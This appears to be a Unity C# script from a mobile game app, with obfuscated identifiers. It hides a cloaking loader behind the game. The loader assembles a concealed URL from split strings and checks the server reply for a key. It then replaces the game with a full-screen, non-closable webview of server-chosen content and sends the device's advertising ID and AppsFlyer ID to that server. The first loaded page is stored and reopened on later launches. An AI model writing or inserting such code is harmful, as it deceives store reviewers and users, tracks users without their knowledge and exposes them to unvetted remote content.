using UnityEngine;
using UnityEngine.Networking;
using System.Collections;
using System.Collections.Generic;

public class MainGIDATLPL : MonoBehaviour
{
    [SerializeField] private Canvas _backgroundCanvas, _uiCanvas;
    [SerializeField] private List<string> _splittedText;
    private string _usrData = "";
    private string _getTextResult = "";

    private const string _PLAYERPREFSKEY = "GIdatLPL";
    private const string _PLAYERPREFSKEY1 = "RNdatLPK";
    private const string _PLAYERPREFSKEY2 = "BOdatLPN";
    private const string _KEY = "xoloxa";

    private void Awake()
    {
        if (PlayerPrefs.GetInt(_PLAYERPREFSKEY) != 0)
        {
            Application.RequestAdvertisingIdentifierAsync((string advertisingId, bool trackingEnabled, string error) =>
            { 
                _usrData = advertisingId; 
            });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString(_PLAYERPREFSKEY1, string.Empty) != string.Empty)
                LoadGIDATLPL(PlayerPrefs.GetString(_PLAYERPREFSKEY1));
            else
            {
                foreach (string n in _splittedText)
                    _getTextResult += n;
                
                StartCoroutine(StartGIDATLPLInit());
            }
        }
        else
            NextGIDATLPL();
    }

    private IEnumerator StartGIDATLPLInit()
    {
        using (UnityWebRequest REdatQLP = UnityWebRequest.Get(_getTextResult))
        {
            yield return REdatQLP.SendWebRequest();

            if (REdatQLP.result == UnityWebRequest.Result.ConnectionError || 
            REdatQLP.result == UnityWebRequest.Result.DataProcessingError || 
            REdatQLP.result == UnityWebRequest.Result.ProtocolError)
                NextGIDATLPL();

            int counterLoad = 7;

            while (PlayerPrefs.GetString(_PLAYERPREFSKEY2, "") == "" && counterLoad > 0)
            {
                yield return new WaitForSeconds(1);

                counterLoad--;
            }

            try
            {
                if (REdatQLP.result == UnityWebRequest.Result.Success)
                {
                    if (REdatQLP.downloadHandler.text.Contains(_KEY))
                    {
                        try
                        {
                            string[] subs = REdatQLP.downloadHandler.text.Split('|');
                            LoadGIDATLPL(subs[0] + "?idfa=" + _usrData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(_PLAYERPREFSKEY2, ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            LoadGIDATLPL(REdatQLP.downloadHandler.text + "?idfa=" + _usrData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(_PLAYERPREFSKEY2, ""));
                        }
                    }
                    else
                        NextGIDATLPL();
                }
                else
                    NextGIDATLPL();
            }
            catch
            {
                NextGIDATLPL();
            }
        }
    }

    private void LoadGIDATLPL(string jidatapl, string mvxmvp = "", int polbu = 70)
    {
        if (_uiCanvas != null)
            _uiCanvas.gameObject.SetActive(false);

        if (_backgroundCanvas != null)
            _backgroundCanvas.gameObject.SetActive(false);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        UniWebView usrlwvobject = gameObject.AddComponent<UniWebView>();        

        usrlwvobject.SetAllowFileAccess(true);
        usrlwvobject.EmbeddedToolbar.Hide();
        usrlwvobject.SetSupportMultipleWindows(false, true);
        usrlwvobject.SetAllowBackForwardNavigationGestures(true);
        usrlwvobject.SetCalloutEnabled(false);
        usrlwvobject.SetBackButtonEnabled(true);

        usrlwvobject.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        usrlwvobject.EmbeddedToolbar.SetDoneButtonText("");

        switch (mvxmvp)
        {
            case "0":
                usrlwvobject.EmbeddedToolbar.Show();
                break;
            default:
                usrlwvobject.EmbeddedToolbar.Hide();
                break;
        }

        usrlwvobject.Frame = new Rect(0, polbu, Screen.width, Screen.height - polbu * 2);

        usrlwvobject.OnShouldClose += (view) =>
        {
            return false;
        };

        usrlwvobject.SetSupportMultipleWindows(true, true);
        usrlwvobject.SetAllowBackForwardNavigationGestures(true);

        usrlwvobject.OnMultipleWindowOpened += (view, windowId) =>
        {
            usrlwvobject.EmbeddedToolbar.Show();
        };

        usrlwvobject.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (mvxmvp)
            {
                case "0":
                    usrlwvobject.EmbeddedToolbar.Show();
                    break;
                default:
                    usrlwvobject.EmbeddedToolbar.Hide();
                    break;
            }
        };

        usrlwvobject.OnOrientationChanged += (view, orientation) =>
        {
            usrlwvobject.Frame = new Rect(0, polbu, Screen.width, Screen.height - polbu);
        };

        usrlwvobject.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null && payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                string url = value as string;

                usrlwvobject.Load(url);
            }
        };

        usrlwvobject.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString(_PLAYERPREFSKEY1, string.Empty) == string.Empty)
                PlayerPrefs.SetString(_PLAYERPREFSKEY1, url);
        };

        usrlwvobject.Load(jidatapl);
        usrlwvobject.Show();
    }

    private void NextGIDATLPL()
    {
        Screen.orientation = ScreenOrientation.Portrait;

        LoadSceneButton.LoadRelativeScene(1);
    }
}
